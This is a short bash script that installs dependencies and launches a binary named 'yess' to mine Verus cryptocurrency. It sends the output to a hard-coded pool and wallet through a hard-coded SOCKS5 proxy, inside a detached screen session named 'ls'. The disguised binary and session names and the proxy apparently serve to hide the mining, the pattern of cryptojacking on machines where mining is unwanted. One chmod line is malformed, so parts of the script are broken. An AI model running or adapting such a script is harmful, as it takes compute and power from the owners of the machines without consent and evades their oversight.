#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x yess chmod 777 yess start0.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVDKJwu7n8mr6rr3qfeRREzknW6bbKQRHN
WORKER=$(echo $(shuf -i 1-1 -n 1)RIG-one)
PROXY=socks5://72.206.181.105:64935
./yess -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
